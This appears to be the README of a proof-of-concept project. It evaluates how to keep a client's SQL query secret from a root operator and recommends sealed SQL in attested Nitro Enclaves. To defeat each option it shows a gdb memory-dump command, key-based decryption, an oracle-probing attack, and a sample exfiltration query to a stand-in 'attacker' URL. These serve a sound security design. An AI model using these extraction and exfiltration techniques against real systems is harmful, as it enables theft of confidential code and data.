# Sealed queries: running a query you are not allowed to read

**The ask.** We run the infrastructure and can read the data. A client's query (their alpha) runs on
that infrastructure, and we must not be able to read it. The query is either compiled ahead of time
or loaded at run time as a module.

**The answer.** Use sealed SQL, run by the stock brrrrr binary inside an attested trusted execution
environment (TEE): AWS Nitro Enclaves, or AMD SEV-SNP / Intel TDX confidential VMs. Only a
client-owned KMS key can unseal the query, and its policy pins the enclave's image measurement.
Nothing in software alone keeps a query secret from someone with root on the machine that runs it:
POCs 1–5 below each fall to one debugger command, or to a few runs on data the operator makes up.
Compiled code modules, native or WASM, hide nothing that sealed SQL in a TEE does not already hide.
They also cost isolation (native) or start-up time (WASM), and they are opaque code we would have to
sandbox. SQL makes the best "module": it is declarative, and trusted code can check it against a
policy.

`./demo.sh` runs every POC below and the attack on each one.

## Threat model

| | |
| --- | --- |
| **Secret** | the query text: its structure, constants, names and comments |
| **Adversary** | us, the operator: root on every host, we run the binaries, serve the data, see all I/O and can change any software |
| **Not secret** | the data (we have it), and the schema |
| **Also required** | an opaque query must not hurt us: it reads no other data, sends nothing over the network, and stays inside CPU and memory limits. We can no longer review the query, so these rules have to be enforced. |

## Results

| # | Option | Hidden from root operator? | Hidden from everyone else? | Protects us from the query | Speed (1M trades) | Built |
| --- | --- | --- | --- | --- | --- | --- |
| 1 | Sealed SQL, runner holds the key | ❌ `age -d` with the runner's key | ✅ logs, disks, backups, staff without host access | ✅ table allowlist | 0.58 s (engine) | `runner` |
| 2 | Obfuscated SQL (names, comments) | ❌ structure and constants stay readable | ~ | — | same | `obfuscate` |
| 3 | Compiled upfront into a binary, encrypted, stripped | ❌ recovered from memory by `gdb` in one command; constants also recovered by probing with made-up data | ✅ | ✅ allowlist | 0.58 s | `baked` |
| 4 | WASM module, loaded at run time | ❌ `strings` | ❌ | ✅✅ no imports: no files, no network; fuel and memory limits | 2.3 s run + 26 s to compile the 11 MB module (cacheable) | `guest` + `wasm_host` |
| 5 | Native `.so` module, loaded at run time | ❌ `strings`, `gdb` | ❌ | ❌ **read `/etc/hostname` into its result** | 2.0 s | `guest` + `so_host` |
| 6 | **Sealed SQL in a TEE, key released only to an attested image** | ✅ an altered image is refused, and so is a forged attestation | ✅ | ✅ allowlist, no network inside the enclave | ≈ engine speed (see below) | `nsm` + `kms` + `enclave` (simulated) |
| – | FHE / garbled circuits / iO | ✅ in theory | ✅ | ✅ | 10⁴–10⁶× slower; iO is not practical at all | no |
| – | Client runs it on their own compute | ✅ | ✅ | n/a | engine | no code needed |

The speed numbers are wall time on 4 vCPUs, for the same query over the same 1M-row CSV. The engine
row is `Lake`, which uses parallel Arrow CSV. The modules use the guest's naive row parser, so the
native and WASM figures compare with each other, not with the engine.

### 1. Sealed SQL (`host/src/bin/runner.rs`)
The client seals the query to the runner's public key (`age -r`). The runner unseals it in memory,
checks it, runs it, and seals both the result and any error to the client's key. Errors go to the
client too, because brrrrr's errors quote the query. **Attack:** the key sits on our host, so
`age -d -i runner.key` recovers the query. This option helps against accidents (query logs, `EXPLAIN`
in a dashboard, backups, support staff) and does nothing against us. It is still the building block
for #6: the client-side format stays the same, and only who holds the key changes.

**The allowlist** in `host/src/lib.rs` (`run`) applies to every option. Before anything runs, core's
compiler resolves every table the query names, subqueries and CTEs included. Anything that is not a
granted table name is refused: `FROM 'https://attacker/?k=...'`, which would send data out, and
`FROM '/other/tenant/*.parquet'`. The check fails closed: a query that core cannot compile on its own
is refused.

### 2. Obfuscated SQL (`host/src/bin/obfuscate.rs`)
This drops comments and renames CTEs and aliases to `_1`, `_2` and so on. The client keeps the
mapping. Rows are byte-identical to the original's. It hides intent, not logic:
`sum(CASE WHEN side = 'buy' ...) ... WHERE abs(_3) > 2.5 ... -0.37 * _3` is still the whole alpha.
Use it only as defence in depth on top of #6.

### 3. Compiled upfront (`baked/`)
`QUERY_FILE=q.sql cargo build -p baked --release` builds one stripped binary per query, with the SQL
encrypted inside it. `strings` finds nothing. **Attack 1:**
`gdb -batch -ex 'catch syscall write' -ex run -ex generate-core-file` dumps memory, and the full
query, comments included, is in it. The binary has to decrypt the query to run it, so the key is in
the binary, and any cipher there is only obfuscation. Generating native code from the plan, so that no
SQL exists at run time, only moves the problem to a disassembler. **Attack 2** needs no reverse
engineering. We serve the data, so we feed it four one-row inputs (`buy 2.4`, `2.5`, `2.6`, `10`) and
read the outputs: threshold `> 2.5`, coefficient `-0.37`. This *oracle attack* defeats every option,
#6 included, whenever the operator can see results. Results therefore go only to the client, sealed.

### 4. WASM module at run time (`guest/`, `host/src/bin/wasm_host.rs`)
This builds brrrrr-core and the query into a `wasm32` module. One change to the product was needed:
a size assertion now applies only on 64-bit targets, in `crates/brrrrr-core/src/agg.rs`. The host
(wasmtime) passes the module no imports, so it can only compute. A module that tries to read a file
gets `operation not supported`. Fuel limits its CPU and a store limit caps its memory.
**This is the best isolation of any option, and no secrecy at all:** WASM decompiles cleanly, and the
module's memory sits inside the host process. Execution is close to native (2.3 s vs 2.0 s), but
Cranelift takes 26 s to compile the 11 MB module, so production would precompile it once
(`Module::serialize`).

### 5. Native module at run time (`guest/`, `host/src/bin/so_host.rs`)
The same guest, built as a native `.so` and loaded with `dlopen`. It is fast, and it is the worst
option: built with `--features exfil`, it read a host file into its result. Running an opaque native
module means sandboxing it ourselves (separate process, seccomp, no network, cgroups), and it is no
more secret than #3.

### 6. TEE: attested key release (`host/src/bin/{nsm,kms,enclave}.rs`)
This simulates the protocol of AWS Nitro Enclaves with KMS. Confidential VMs follow the same pattern
with a different attestation service.

```
client:   query.key → client's own KMS, policy: "release only to image <measurement>"
          q.sql.age = seal(query.key.pub, sql)
enclave:  makes an ephemeral key pair; hardware signs {measurement of this image, ephemeral pub}
          → parent (operator) relays the attestation → KMS checks signature + measurement
          → KMS returns query.key sealed to the ephemeral pub (Nitro: CiphertextForRecipient)
          → enclave unseals the query, applies the allowlist, runs brrrrr, seals the result to the client
operator: sees the attestation, a sealed key, a sealed query, a sealed result
```

Demo outcomes:
- the genuine enclave gets the key and the client decrypts the result;
- an enclave built with `--features leak` (prints the query) has a different measurement, and the KMS
  refuses it;
- an attestation the operator signs with its own key fails the signature check.

What the simulation does **not** show is the memory isolation itself. Here the enclave is an ordinary
process, so the gdb attack from #3 would still work. In a real Nitro Enclave the parent instance's
root cannot read enclave memory, and a debug-mode enclave reports all-zero PCRs, so the KMS refuses
it. That isolation is hardware's job, and it is the only part of this design we cannot build.

## Recommendation

**Build #6 on AWS Nitro Enclaves, with #1 as the first step toward it.** Both use the same
client-facing format: SQL sealed to a key, results sealed back. Clients integrate once.

1. **Now (days): #1 in the product.** Seal queries to a KMS key the *client* owns, so every decrypt
   shows up in their CloudTrail. Add the table allowlist and redacted errors. This is honestly
   "trust plus audit", not secrecy from us, but it closes every accidental leak.
2. **Next (weeks): the same runner inside a Nitro Enclave.** brrrrr fits well: one static binary,
   a pure core with no I/O, low memory, and data fed over vsock by the parent. The client's KMS key
   policy pins `kms:RecipientAttestation:ImageSha384` (PCR0). The client owns the key, so we cannot
   loosen the policy. If we owned it, we could.
3. **Not:** native or WASM query modules. They add nothing secret on top of #6, and they turn a
   policy-checkable query into code we have to sandbox. If clients need logic SQL cannot express,
   the extension point is a brrrrr function registry (ADR-0011), not client binaries.

Not on AWS: GCP Confidential Space (SEV/TDX, workload identity releases KMS keys on the image
digest) or Azure confidential containers with Secure Key Release have the same shape. On-prem:
SEV-SNP or TDX hosts with a key broker (the Confidential Containers project's Trustee).

## Tradeoffs of the recommendation

**What it buys**
- Real secrecy from us, enforced by hardware and by a key we do not control. No other built option
  gives that.
- One engine and one semantics. The query is ordinary SQL running in the ordinary binary. No codegen,
  no module ABI, no second runtime.
- The opaque query is checked by code both sides can audit: allowlist, no network, limits.

**What it costs and what still leaks**
- **Trust moves to AWS (or AMD/Intel), it does not disappear.** TEEs have had side-channel breaks:
  SGX many times, SEV a few. Nitro gives enclaves dedicated cores, which narrows that.
- **Access patterns leak.** The parent sees which tables, columns and time ranges the enclave asks
  for. brrrrr reads only the columns and partitions a query needs, and that alone reveals a lot. The
  fix is to stream a fixed superset per entitlement (every column, the whole date range), at the cost
  of more I/O.
- **Result size and timing leak.** So does the oracle attack, if we ever see results. Results go
  sealed to the client only. Never feed them into systems we operate.
- **Reproducible builds become a requirement.** The client must rebuild the enclave image and get the
  same PCR0, or trust an auditor's signature (PCR8). The Rust toolchain is already pinned; the
  Docker base image and paths need pinning too.
- **Operations get harder.** No shell, no debugger and no query in our logs, by design. Clients debug
  locally with the same binary on sample data. Our metrics are aggregates only.
- **Resources:** enclave memory and vCPUs are taken from the parent instance (no extra charge beyond
  the instance), with no disk and no network. Live views over Kafka need a vsock proxy. Historical
  queries need data streamed in.
- **Effort:** the protocol is about 100 lines here. Production adds a vsock data source, the
  allowlist and redaction in `brrrrr-lake`, the EIF build, a reproducible-build pipeline and the
  KMS integration.

**Rejected, and why**
- **Software obfuscation (#2, #3, OLLVM-style tools, commercial packers):** slows a determined
  operator down by minutes to days and never stops them. The oracle attack skips the binary entirely.
- **WASM (#4):** excellent sandbox, no secrecy. Worth keeping in mind only if we ever run *untrusted
  code* rather than SQL.
- **Native modules (#5):** no secrecy, and arbitrary code execution on our hosts.
- **FHE, MPC, iO:** FHE costs milliseconds per encrypted operation. A 1M-row VWAP would take hours
  where it now takes a second. Keeping the *function* secret means evaluating a universal circuit,
  which is worse still. Indistinguishability obfuscation is not practical.
- **Client-side execution:** the strongest secrecy, but we no longer run the compute, data leaves our
  infrastructure (market-data licences often forbid that), and egress costs grow. It works well as a
  hybrid: we compute non-secret features (bars, joins), and the secret last step runs on their side
  over a small output.

## Layout

| | |
| --- | --- |
| `host/src/lib.rs` | the allowlisted `run`, age helpers, module input |
| `host/src/bin/runner.rs` | #1 |
| `host/src/bin/obfuscate.rs` | #2 |
| `baked/` | #3 (`build.rs` encrypts `QUERY_FILE` into the binary) |
| `guest/` | #4 and #5: the query module (`QUERY_FILE`), wasm32 or native |
| `host/src/bin/wasm_host.rs`, `so_host.rs` | #4, #5 |
| `host/src/bin/nsm.rs`, `kms.rs`, `enclave.rs` | #6: mock hardware, mock client KMS, the enclave |
| `demo/alpha.sql` | the "secret" query |
| `demo.sh` | all of the above, and the attacks |

This is a separate Cargo workspace. Nothing here goes into the brrrrr binary, its CI or `cargo deny`.
The guest's CSV parser is naive (no quoting); production would pass Arrow IPC.
